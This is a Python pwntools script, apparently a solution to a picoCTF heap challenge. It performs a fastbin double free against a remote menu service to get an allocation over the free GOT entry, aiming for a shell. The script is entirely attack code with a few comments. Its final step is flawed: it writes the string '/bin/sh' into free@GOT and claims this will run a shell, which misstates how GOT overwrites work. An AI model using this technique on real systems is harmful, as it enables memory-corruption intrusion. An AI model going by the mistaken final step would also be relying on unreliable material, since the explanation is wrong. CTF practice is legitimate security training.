#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
p = remote('jupiter.challenges.picoctf.org', 9521)

p.recvuntil(b'name?')
p.sendline(b'hacker')

def alloc(size, data):
    p.recvuntil(b'>')
    p.sendline(b'1')
    p.recvuntil(b'How much?')
    p.sendline(str(size).encode())
    p.recvuntil(b'Describe')
    p.sendline(data)

def free(idx):
    p.recvuntil(b'>')
    p.sendline(b'2')
    p.recvuntil(b'Which')
    p.sendline(str(idx).encode())

log.info("Triggering double free...")

# Allocar 3 chunks del mismo tamaño (fastbin)
alloc(0x40, b'AAAA')  # 0
alloc(0x40, b'BBBB')  # 1
alloc(0x40, b'CCCC')  # 2

# Double free
free(0)
free(1)  # Evitar detección
free(0)  # Double free!

# Ahora el fastbin es: 0 -> 1 -> 0
# Podemos controlar el fd pointer

# Allocar y poner dirección objetivo
target = 0x602018  # GOT de free
alloc(0x40, p64(target))  # Obtiene chunk 0, escribe target como fd

# Allocar dos veces más
alloc(0x40, b'YYYY')  # Obtiene chunk 1
alloc(0x40, b'ZZZZ')  # Obtiene chunk 0 otra vez

# El próximo malloc nos dará la dirección target!
alloc(0x40, b'/bin/sh\x00')  # ¡Escribiendo en GOT!

# Ahora free@got apunta a "/bin/sh"
# Si llamamos free, ejecutará lo que esté ahí

# Intentar obtener shell
p.sendline(b'2')  # Free
p.sendline(b'0')  # Trigger

p.interactive()